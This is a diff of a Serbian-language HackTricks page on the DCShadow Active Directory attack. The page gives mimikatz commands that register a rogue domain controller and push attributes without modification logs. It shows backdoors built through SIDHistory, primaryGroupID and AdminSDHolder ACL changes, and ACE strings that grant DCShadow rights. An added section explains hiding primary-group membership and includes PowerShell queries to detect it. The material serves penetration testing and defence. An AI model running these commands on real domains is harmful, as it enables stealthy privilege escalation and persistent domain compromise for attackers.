@@ -1,11 +1,14 @@
-{{#include ../../banners/hacktricks-training.md}}
-
 # DCShadow
 
-Registruje **novi Kontroler domena** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na specificirane objekte **bez** ostavljanja bilo kakvih **logova** u vezi sa **modifikacijama**. **Potrebne su DA** privilegije i morate biti unutar **root domena**.\
-Imajte na umu da ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.
+{{#include ../../banners/hacktricks-training.md}}
 
-Da biste izvršili napad, potrebne su vam 2 instance mimikatz. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate naznačiti promene koje želite da izvršite), a druga instanca će se koristiti za guranja vrednosti:
+
+## Osnovne informacije
+
+Registruje **novi Domain Controller** u AD i koristi ga da **push attributes** (SIDHistory, SPNs...) na određenim objektima **without** leaving any **logs** regarding the **modifications**. Potrebne su ti **DA** privilegije i moraš biti unutar **root domain**.\
+Imaj na umu da će, ako koristiš pogrešne podatke, pojaviti prilično ružni **logs**.
+
+Za izvođenje napada potrebna su ti 2 **mimikatz** instance. Jedna od njih će pokrenuti **RPC servers** sa **SYSTEM** privilegijama (ovde moraš navesti izmene koje želiš da izvršiš), a druga instanca će se koristiti da **push the values**:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -15,26 +18,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
-Napomena da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to podiglo privilegije niti, ali nam je potrebno da podignemo **privilegiju procesa**.\
-Takođe možete odabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Obratite pažnju da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to uzdiglo privilegije threada, ali treba da uzdigujemo **privilegiju procesa**.\
+Takođe možete izabrati i "LDAP" object: /object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local
 
-Možete primeniti promene iz DA ili od korisnika sa ovim minimalnim dozvolama:
+Možete primeniti izmene sa DA ili sa korisnika koji ima ova minimalna ovlašćenja:
 
 - U **objektu domena**:
-- _DS-Install-Replica_ (Dodaj/Ukloni Repliku u Domen)
-- _DS-Replication-Manage-Topology_ (Upravljanje Replikacionom Topologijom)
-- _DS-Replication-Synchronize_ (Replikaciona Sinhronizacija)
-- **Objekat Lokacija** (i njeni podobjekti) u **Konfiguracionom kontejneru**:
+- _DS-Install-Replica_ (dodavanje/uklanjanje replike u domenu)
+- _DS-Replication-Manage-Topology_ (upravljanje replikacionom topologijom)
+- _DS-Replication-Synchronize_ (sinhronizacija replikacije)
+- Objekat **Sites** (i njegovi potomci) u **Configuration** kontejneru:
 - _CreateChild and DeleteChild_
 - Objekat **računara koji je registrovan kao DC**:
-- _WriteProperty_ (Ne Write)
+- _WriteProperty_ (Not Write)
 - **Ciljni objekat**:
-- _WriteProperty_ (Ne Write)
+- _WriteProperty_ (Not Write)
 
-Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije korisniku bez privilegija (napomena da će ovo ostaviti neke logove). Ovo je mnogo restriktivnije od imanja DA privilegija.\
-Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada se prijavi na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.
+Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije neprivilegovanom korisniku (imajte na umu da će ovo ostaviti neke logove). Ovo je znatno restriktivnije nego imati DA privilegije.\
+Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada je prijavljeno na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.
 
-## Korišćenje DCShadow za kreiranje zadnjih vrata
+## Korišćenje DCShadow za kreiranje backdoors
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -49,22 +52,53 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
-## Shadowception - Dodelite DCShadow dozvole koristeći DCShadow (bez izmenjenih logova dozvola)
+### Zloupotreba primarne grupe, praznine u enumeraciji i detekcija
 
-Moramo dodati sledeće ACE-ove sa SID-om našeg korisnika na kraju:
+- `primaryGroupID` je zaseban atribut u odnosu na listu `member` grupe. DCShadow/DSInternals mogu ga direktno upisati (npr. postaviti `primaryGroupID=512` za **Domain Admins**) bez on-box LSASS enforcement, ali AD i dalje **premesti** korisnika: promena PGID uvek uklanja članstvo iz prethodne primarne grupe (isto ponašanje važi za bilo koju ciljnu grupu), tako da ne možete zadržati staro članstvo primarne grupe.
+- Podrazumevani alati onemogućavaju uklanjanje korisnika iz njihove trenutne primarne grupe (`ADUC`, `Remove-ADGroupMember`), pa promena PGID obično zahteva direktne upise u direktorijum (DCShadow/`Set-ADDBPrimaryGroup`).
+- Izveštavanje o članstvu nije konzistentno:
+- **Uključuje** članove izvedene iz primarne grupe: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
+- **Izostavlja** članove izvedene iz primarne grupe: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
+- Rekurzivne provere mogu propustiti članove primarne grupe ako je **primarna grupa sama ugnježdena** (npr. PGID korisnika ukazuje na ugnježdenu grupu unutar Domain Admins); `Get-ADGroupMember -Recursive` ili LDAP rekurzivni filtri neće vratiti tog korisnika osim ako rekurzija eksplicitno ne razreši primarne grupe.
+- DACL trikovi: napadači mogu **deny ReadProperty** na `primaryGroupID` kod korisnika (ili na atributu `member` grupe za ne-AdminSDHolder grupe), skrivajući efektivno članstvo od većine PowerShell upita; `net group` će i dalje razrešiti članstvo. Grupe zaštićene AdminSDHolder će resetovati takva deny pravila.
+
+Detection/monitoring examples:
+```powershell
+# Find users whose primary group is not the default Domain Users (RID 513)
+Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
+Where-Object { $_.primaryGroupID -ne 513 } |
+Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
+```
+
+```powershell
+# Find users where primaryGroupID cannot be read (likely denied via DACL)
+Get-ADUser -Filter * -Properties primaryGroupID |
+Where-Object { -not $_.primaryGroupID } |
+Select-Object Name,SamAccountName
+```
+Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.
+
+## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+
+Potrebno je dodati sledeće ACE-e sa SID-om našeg korisnika na kraju:
 
 - Na objektu domena:
 - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
 - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 - Na objektu računara napadača: `(A;;WP;;;UserSID)`
-- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
-- Na objektu Lokacije u Konfiguracionom kontejneru: `(A;CI;CCDC;;;UserSID)`
+- Na objektu ciljanog korisnika: `(A;;WP;;;UserSID)`
+- Na Sites objektu u Configuration kontejneru: `(A;CI;CCDC;;;UserSID)`
 
-Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Da biste dobili trenutni ACE nekog objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-Obratite pažnju da u ovom slučaju treba da napravite **several changes,** ne samo jedan. Dakle, u **mimikatz1 session** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da napravite. Na ovaj način, biće vam potrebno samo **`/push`** jedan put da izvršite sve zadržane promene na lažnom serveru.
+Obratite pažnju da u ovom slučaju morate napraviti **više izmena**, ne samo jednu. Dakle, u **mimikatz1 session** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da izvršite. Na ovaj način biće vam potrebno samo da jednom izvršite **`/push`** da biste primenili sve nagomilane izmene na rogue serveru.
 
-[**Više informacija o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+
+## References
+
+- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
+- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
